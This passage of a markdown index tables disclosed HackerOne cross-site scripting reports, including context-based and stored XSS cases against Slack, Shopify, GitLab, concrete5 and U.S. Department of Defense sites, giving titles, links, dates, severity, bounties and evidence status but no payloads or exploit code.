| CONT-155 | [Blind XSS in mapbox.com/contact](https://hackerone.com/reports/158461) | Mapbox | 2016-08-11T00:00:00 | Not disclosed in the source | $750 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-156 | [Cross site scripting](https://hackerone.com/reports/158757) | Binary.com | 2016-08-12T00:00:00 | Not disclosed in the source | $75 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-157 | [XSS On meta tags in profile page](https://hackerone.com/reports/159984) | GitLab | 2016-08-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-158 | [XSS Via Method injection](https://hackerone.com/reports/161621) | Gratipay | 2016-08-20T00:00:00 | none | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-159 | [Cross Site Scripting In Profile Statement](https://hackerone.com/reports/162120) | Gratipay | 2016-08-22T00:00:00 | none | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-160 | [Unsanitized Location Name in POS Channel can lead to XSS in Orders Timeline](https://hackerone.com/reports/166887) | Shopify | 2016-09-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-161 | [XSS in SHOPIFY: Unsanitized Supplier Name can lead to XSS in Transfers Timeline](https://hackerone.com/reports/167075) | Shopify | 2016-09-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-162 | [Follow Button XSS](https://hackerone.com/reports/172574) | Automattic | 2016-09-28T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-163 | [Google Authenticator - Cross Site Scripting](https://hackerone.com/reports/172606) | Ian Dunn | 2016-09-28T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-164 | [Critical : Malware and XSS file can be uploaded and executed on udemy](https://hackerone.com/reports/172694) | Udemy | 2016-09-28T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-165 | [xss on demo.nextcloud.com due to outdated version](https://hackerone.com/reports/177713) | Nextcloud | 2016-10-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-166 | [Cross-site scripting (XSS) vulnerability on a DoD website](https://hackerone.com/reports/184495) | U.S. Dept Of Defense | 2016-11-23T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-167 | [Cross-site scripting vulnerability on a DoD website](https://hackerone.com/reports/184575) | U.S. Dept Of Defense | 2016-11-23T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-168 | [XSS on a DoD website](https://hackerone.com/reports/184759) | U.S. Dept Of Defense | 2016-11-24T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-169 | [XSS in my.shopify.com in widget](https://hackerone.com/reports/185826) | Shopify | 2016-11-27T00:00:00 | medium | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-170 | [Cross-site scripting (XSS) vulnerability on a DoD website](https://hackerone.com/reports/186315) | U.S. Dept Of Defense | 2016-11-29T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-171 | [Cross-Site Scripting (XSS) on a DoD website](https://hackerone.com/reports/186402) | U.S. Dept Of Defense | 2016-11-29T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-172 | [Arbitrary Script Injection (Mail) in a DoD Website](https://hackerone.com/reports/187232) | U.S. Dept Of Defense | 2016-12-01T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-173 | [Store XSS](https://hackerone.com/reports/187410) | Slack | 2016-12-01T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-174 | [XSS vulnerability on an Army website](https://hackerone.com/reports/187881) | U.S. Dept Of Defense | 2016-12-03T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-175 | [[controlsyou.quora.com] 429 Too Many Requests Error-Page XSS](https://hackerone.com/reports/189768) | Quora | 2016-12-09T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-176 | [[Android] XSS via start ContentActivity](https://hackerone.com/reports/189793) | Quora | 2016-12-09T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-177 | [[network.informatica.com] The login form XSS via the referer value](https://hackerone.com/reports/190016) | Informatica | 2016-12-10T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-178 | [[careers.informatica.com] XSS on "isJTN"](https://hackerone.com/reports/190020) | Informatica | 2016-12-10T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-179 | [XSS on manually entering Postal codes](https://hackerone.com/reports/190951) | Shopify | 2016-12-13T00:00:00 | medium | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-180 | [XSS on postal codes](https://hackerone.com/reports/192140) | Shopify | 2016-12-18T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-181 | [XSS vulnerability on Audio and Video parsers](https://hackerone.com/reports/192223) | Discourse | 2016-12-18T00:00:00 | high | $256 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-182 | [XSS vulnerability on a DoD website](https://hackerone.com/reports/192751) | U.S. Dept Of Defense | 2016-12-20T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-183 | [XSS in instacart.com/store/partner_recipe](https://hackerone.com/reports/196221) | Instacart | 2017-01-06T00:00:00 | medium | $100 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-184 | [XSS on username when register to proffesional account](https://hackerone.com/reports/196989) | FormAssembly | 2017-01-09T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-185 | [[IMP] - Blind XSS in the admin panel for reviewing comments](https://hackerone.com/reports/197337) | Rockstar Games | 2017-01-10T00:00:00 | medium | $650 | Cross-site Scripting (XSS) - Generic | *.rockstargames.com | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-186 | [XSS in topics because of bandcamp preview engine vulnerability](https://hackerone.com/reports/197443) | Discourse | 2017-01-11T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-187 | [[RDoc] XSS in project README files](https://hackerone.com/reports/200693) | GitLab | 2017-01-24T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-188 | [Cross-site scripting (XSS) on a DoD website](https://hackerone.com/reports/203060) | U.S. Dept Of Defense | 2017-02-02T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-189 | [Wordpress 4.7.2 - Two XSS in Media Upload when file too large.](https://hackerone.com/reports/203515) | WordPress | 2017-02-05T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-190 | [[reStructuredText] XSS in project README files](https://hackerone.com/reports/205497) | GitLab | 2017-02-11T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-191 | [[Textile] XSS in project README files](https://hackerone.com/reports/205498) | GitLab | 2017-02-11T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-192 | [Cross-site scripting (XSS) vulnerability on a DoD website](https://hackerone.com/reports/208556) | U.S. Dept Of Defense | 2017-02-24T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-193 | [hosted.weblate.org: X-XSS-Protection not enabled](https://hackerone.com/reports/223396) | Weblate | 2017-04-24T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-194 | [weblate.org: X-XSS-Protection not enabled](https://hackerone.com/reports/223723) | Weblate | 2017-04-25T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-195 | [XSS at in instacart.com/store/partner_recipe](https://hackerone.com/reports/227809) | Instacart | 2017-05-12T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |
| CONT-196 | [Cross-site Scripting (XSS) in /updates-pro/archive/](https://hackerone.com/reports/235866) | MapsMarker.com e.U. | 2017-06-02T00:00:00 | critical | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Context-Based-XSS.md](../../Context-Based-XSS.md) |

<details><summary>Retrieval limitations for this group</summary>

- CONT-076 (https://hackerone.com/reports/72526): Partial report (official disclosure summary only).
- CONT-078 (https://hackerone.com/reports/78003): Partial report (official disclosure summary only).
- CONT-080 (https://hackerone.com/reports/81212): Partial report (official disclosure summary only).
- CONT-084 (https://hackerone.com/reports/85577): Partial report (official disclosure summary only).
- CONT-092 (https://hackerone.com/reports/95599): Partial report (official disclosure summary only).
- CONT-104 (https://hackerone.com/reports/109352): Partial report (official disclosure summary only).
- CONT-105 (https://hackerone.com/reports/109461): Partial report (official disclosure summary only).
- CONT-106 (https://hackerone.com/reports/111131): Partial report (official disclosure summary only).
- CONT-107 (https://hackerone.com/reports/111475): Partial report (official disclosure summary only).
- CONT-110 (https://hackerone.com/reports/112001): Partial report (official disclosure summary only).
- CONT-121 (https://hackerone.com/reports/120683): Partial report (official disclosure summary only).
- CONT-139 (https://hackerone.com/reports/137126): Partial report (official disclosure summary only).
- CONT-143 (https://hackerone.com/reports/142078): Partial report (official disclosure summary only).
- CONT-155 (https://hackerone.com/reports/158461): Partial report (official disclosure summary only).
- CONT-156 (https://hackerone.com/reports/158757): Partial report (official disclosure summary only).
- CONT-164 (https://hackerone.com/reports/172694): Partial report (official disclosure summary only).
- CONT-166 (https://hackerone.com/reports/184495): Partial report (official disclosure summary only).
- CONT-167 (https://hackerone.com/reports/184575): Partial report (official disclosure summary only).
- CONT-168 (https://hackerone.com/reports/184759): Partial report (official disclosure summary only).
- CONT-170 (https://hackerone.com/reports/186315): Partial report (official disclosure summary only).
- CONT-171 (https://hackerone.com/reports/186402): Partial report (official disclosure summary only).
- CONT-172 (https://hackerone.com/reports/187232): Partial report (official disclosure summary only).
- CONT-174 (https://hackerone.com/reports/187881): Partial report (official disclosure summary only).
- CONT-182 (https://hackerone.com/reports/192751): Partial report (official disclosure summary only).
- CONT-184 (https://hackerone.com/reports/196989): Partial report (official disclosure summary only).
- CONT-185 (https://hackerone.com/reports/197337): Partial report (official disclosure summary only).
- CONT-188 (https://hackerone.com/reports/203060): Partial report (official disclosure summary only).
- CONT-192 (https://hackerone.com/reports/208556): Partial report (official disclosure summary only).

</details>

#### Stored-XSS → [`Stored-XSS.md`](../../Stored-XSS.md)

154 sources. Weakness field as published by HackerOne:

- Cross-site Scripting (XSS) - Generic: 132
- Cross-site Scripting (XSS) - Stored: 22

| Case ID | Original report title | Program | Published | Severity | Bounty | Weakness (H1) | Affected asset | Evidence | Playbook |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| STOR-001 | [Stored XSS in www.slack-files.com](https://hackerone.com/reports/2617) | Slack | 2014-03-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-002 | [Stored XSS in username.slack.com](https://hackerone.com/reports/2625) | Slack | 2014-03-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-003 | [Stored XSS in Channel Chat](https://hackerone.com/reports/2652) | Slack | 2014-03-02T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-004 | [Stored XSS](https://hackerone.com/reports/2926) | Slack | 2014-03-03T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-005 | [Persistent XSS: Editor link](https://hackerone.com/reports/4114) | Phabricator | 2014-03-16T00:00:00 | Not disclosed in the source | $300 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-006 | [Stored XSS in Slackbot Direct Messages](https://hackerone.com/reports/4561) | Slack | 2014-03-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-007 | [Stored XSS in Slack.com](https://hackerone.com/reports/6002) | Slack | 2014-04-06T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-008 | [Stored XSS {dangerous?} https://www.khanacademy.org/coach/roster/?listId=allStudents](https://hackerone.com/reports/6369) | Khan Academy | 2014-04-07T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-009 | [Persistent class XSS [the fuck]](https://hackerone.com/reports/6412) | Khan Academy | 2014-04-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-010 | [Persistent Cross Site Scripting within the IRCCloud Pastebin](https://hackerone.com/reports/7121) | IRCCloud | 2014-04-11T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-011 | [Dangerous Persistent xss](https://hackerone.com/reports/7441) | IRCCloud | 2014-04-13T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-012 | [Stored XSS](https://hackerone.com/reports/7873) | Localize | 2014-04-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-013 | [Persistent Cross-site scripting vulnerability settings.](https://hackerone.com/reports/7898) | Respondly | 2014-04-17T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-014 | [Stored XSS in all fields in Basic Google Maps Placemarks Settings](https://hackerone.com/reports/9375) | Ian Dunn | 2014-04-23T00:00:00 | Not disclosed in the source | $25 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-015 | [Stored XSS Found](https://hackerone.com/reports/9774) | Slack | 2014-04-25T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-016 | [Stored XSS in slack.com (integrations)](https://hackerone.com/reports/10297) | Slack | 2014-04-29T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-017 | [Cross Site Scripting (Stored)](https://hackerone.com/reports/20221) | ExpressionEngine | 2014-07-16T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-018 | [Stored xss](https://hackerone.com/reports/27846) | Twitter | 2014-09-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-019 | [Stored XSS in concrete5 5.7.0.4.](https://hackerone.com/reports/30019) | concrete5 | 2014-10-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-020 | [a stored xss in slack integration https://onerror.slack.com/services/import](https://hackerone.com/reports/33018) | Slack | 2014-10-28T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-021 | [[Stored XSS] vine.co - profile page](https://hackerone.com/reports/36986) | Twitter | 2014-11-21T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-022 | [stored XSS in concrete5 5.7.2.1](https://hackerone.com/reports/38890) | concrete5 | 2014-12-10T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-023 | [Stored XSS in api key of operator wallet](https://hackerone.com/reports/41758) | Romit | 2014-12-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-024 | [stored xss in transaction](https://hackerone.com/reports/42161) | Romit | 2014-12-30T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-025 | [Stored XSS in adding fileset](https://hackerone.com/reports/42248) | concrete5 | 2015-01-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-026 | [Stored XSS in Direct debit name](https://hackerone.com/reports/45233) | Mobile Vikings | 2015-01-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-027 | [Stored xss in user name](https://hackerone.com/reports/47343) | Mobile Vikings | 2015-02-10T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-028 | [Stored xss in user name (2) affected another user.](https://hackerone.com/reports/47349) | Mobile Vikings | 2015-02-10T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-029 | [Stored XSS on Blog's page Tile](https://hackerone.com/reports/50552) | concrete5 | 2015-03-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-030 | [Stored XSS on Title of Page List in edit page list](https://hackerone.com/reports/50554) | concrete5 | 2015-03-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-031 | [Stored XSS on Search Title](https://hackerone.com/reports/50556) | concrete5 | 2015-03-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-032 | [Stored XSS in Contact Form](https://hackerone.com/reports/50564) | concrete5 | 2015-03-08T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-033 | [Stored XSS in Title of the topic List](https://hackerone.com/reports/50626) | concrete5 | 2015-03-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-034 | [Stored XSS in title of date navigation](https://hackerone.com/reports/50627) | concrete5 | 2015-03-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-035 | [Stored XSS in Feature tile](https://hackerone.com/reports/50639) | concrete5 | 2015-03-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-036 | [Stored Xss in Feature Paragraph](https://hackerone.com/reports/50642) | concrete5 | 2015-03-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-037 | [Stored XSS in Testimonial name](https://hackerone.com/reports/50644) | concrete5 | 2015-03-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-038 | [Stored XSS in Testimonial Position](https://hackerone.com/reports/50645) | concrete5 | 2015-03-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-039 | [Stored XSS in testimonial Company](https://hackerone.com/reports/50656) | concrete5 | 2015-03-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-040 | [Stored XSS In Company URL](https://hackerone.com/reports/50662) | concrete5 | 2015-03-09T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-041 | [Stored XSS in Bio/Quote](https://hackerone.com/reports/50779) | concrete5 | 2015-03-10T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-042 | [Stored XSS in Message to Display When No Pages Listed.](https://hackerone.com/reports/50780) | concrete5 | 2015-03-10T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-043 | [Stored XSS in Image Alt. Text](https://hackerone.com/reports/50782) | concrete5 | 2015-03-10T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-044 | [Stored xss in editor](https://hackerone.com/reports/53730) | Mapbox | 2015-03-28T00:00:00 | Not disclosed in the source | $1,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-045 | [Persistent cross-site scripting (XSS) in map attribution](https://hackerone.com/reports/54327) | Mapbox | 2015-04-02T00:00:00 | Not disclosed in the source | $1,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-046 | [[persistent cross-site scripting] customers can target admins](https://hackerone.com/reports/55842) | Shopify | 2015-04-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-047 | [Stored XSS in the Shopify Discussion Forums](https://hackerone.com/reports/59015) | Shopify | 2015-04-29T00:00:00 | Not disclosed in the source | $500 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-048 | [Stored Cross-Site Scripting in Map Share Page](https://hackerone.com/reports/65284) | Mapbox | 2015-06-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-049 | [No CSRF protection when creating new community points actions, and related stored XSS](https://hackerone.com/reports/65808) | concrete5 | 2015-06-04T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-050 | [Stored XSS в имени песни (2) на платёжном гейте.](https://hackerone.com/reports/78260) | ok.ru | 2015-07-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-051 | [apps.owncloud.com: Stored XSS in profile page](https://hackerone.com/reports/84371) | ownCloud | 2015-08-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-052 | [Stored XSS On Statement](https://hackerone.com/reports/84740) | Gratipay | 2015-08-26T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-053 | [Stored XSS on player.vimeo.com](https://hackerone.com/reports/85488) | Vimeo | 2015-08-29T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
| STOR-054 | [Stored XSS on vimeo.com and player.vimeo.com](https://hackerone.com/reports/87577) | Vimeo | 2015-09-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Stored-XSS.md](../../Stored-XSS.md) |
